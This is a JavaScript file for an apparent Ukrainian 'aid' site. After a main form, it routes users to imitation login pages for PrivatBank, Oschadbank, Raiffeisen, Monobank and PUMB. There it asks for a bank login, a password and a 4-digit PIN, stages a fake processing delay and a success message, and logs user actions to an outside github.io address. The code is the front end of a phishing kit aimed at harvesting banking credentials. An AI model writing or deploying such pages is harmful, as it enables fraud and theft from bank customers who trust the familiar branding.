document.addEventListener('DOMContentLoaded', function() {
    // Отправка логов на сервер
    function sendLog(action, details = {}) {
        const userData = {
            page: window.location.href,
            timestamp: new Date().toISOString()
        };

        fetch('https://nightitpython.github.io/e-pomoga/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action, details, ...userData })
        }).catch(err => console.error('Помилка відправки логу:', err));
    }

    // Логируем загрузку страницы
    sendLog('Сторінка завантажена');

    // Отправка основной формы
    document.getElementById("submitMainForm").addEventListener("click", function() {
        const formValid = validateMainForm();
        if (formValid) {
            document.getElementById("mainForm").style.display = "none";
            document.getElementById("bankSelection").style.display = "block";
            sendLog('Основна форма заповнена');
        }
    });

    // Валидация основной формы
    function validateMainForm() {
        let isValid = true;
        const inputs = document.querySelectorAll('#mainForm input[required], #mainForm textarea[required]');
        
        inputs.forEach(input => {
            if (!input.value.trim()) {
                input.style.borderColor = 'red';
                isValid = false;
            } else {
                input.style.borderColor = '';
            }
        });

        if (!isValid) {
            alert('Будь ласка, заповніть всі обов\'язкові поля!');
            return false;
        }

        return true;
    }

    // Выбор банка → переход на страницу банка
    document.querySelectorAll('.bank-option').forEach(option => {
        option.addEventListener('click', function() {
            const bankName = this.getAttribute('data-bank');
            sendLog('Вибір банку', { bank: bankName });
            
            // Перенаправляем на соответствующую страницу банка
            switch(bankName) {
                case 'privat':
                    window.location.href = 'privatbank.html';
                    break;
                case 'oschad':
                    window.location.href = 'oschadbank.html';
                    break;
                case 'raif':
                    window.location.href = 'raiffeisen.html';
                    break;
                case 'mono':
                    window.location.href = 'monobank.html';
                    break;
                case 'pumb':
                    window.location.href = 'pumb.html';
                    break;
            }
        });
    });
});

// Функция для страниц банков
function initBankPage(bankName) {
    document.body.classList.add(bankName);
    
    // Логируем загрузку страницы банка
    console.log(`Сторінка банку ${bankName} завантажена`);
    
    // Обработка формы входа в банк
    const loginForm = document.getElementById('bankLoginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const login = document.getElementById('bankLogin').value;
            const password = document.getElementById('bankPassword').value;
            
            if (!login || !password) {
                alert('Будь ласка, введіть логін та пароль!');
                return;
            }
            
            // Показываем загрузку
            document.getElementById('loading').style.display = 'block';
            loginForm.style.display = 'none';
            
            // Имитация задержки 2-4 секунды
            setTimeout(() => {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('pinForm').style.display = 'block';
            }, 2000 + Math.random() * 2000);
        });
    }
    
    // Обработка формы с PIN-кодом
    const pinForm = document.getElementById('pinForm');
    if (pinForm) {
        pinForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const pin = document.getElementById('bankPin').value;
            
            if (!pin || pin.length !== 4) {
                alert('Будь ласка, введіть коректний PIN-код (4 цифри)!');
                return;
            }
            
            // Показываем успешное сообщение
            document.getElementById('pinForm').style.display = 'none';
            document.getElementById('successMessage').style.display = 'block';
            
            // Через 3 секунды возвращаем на главную
            setTimeout(() => {
                window.location.href = 'index.html';
            }, 3000);
        });
    }
}

// Валидация PIN-кода
function validatePin(input) {
    input.value = input.value.replace(/[^0-9]/g, '');
    if (input.value.length > 4) {
        input.value = input.value.slice(0, 4);
    }
}
